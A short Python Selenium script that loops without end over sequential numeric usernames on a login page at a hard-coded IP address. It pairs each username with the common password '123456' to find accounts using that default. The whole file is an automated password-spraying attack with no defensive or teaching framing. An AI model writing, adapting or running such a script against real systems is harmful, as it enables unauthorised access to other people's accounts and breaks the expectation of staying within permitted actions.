#!/usr/bin/env python
# coding: utf-8
#Yuetao Li
#07/29/2016

from selenium import webdriver
from selenium.webdriver.common.alert import Alert
from bs4 import BeautifulSoup
import time

number = 2015530000
driver = webdriver.Firefox()
driver.get("http://202.96.165.8/EI/Login.aspx")
time.sleep(2)
while True:
    number += 1
    driver.find_element_by_name("TxtUserName").clear()
    driver.find_element_by_name("TxtUserName").send_keys(str(number))
    driver.find_element_by_name("TxtPassword").send_keys("123456")
    driver.find_element_by_id("ImgbtnLogin").click()
    alert = driver.switch_to_alert()
    alert.dismiss()
time.sleep(2)
driver.close()
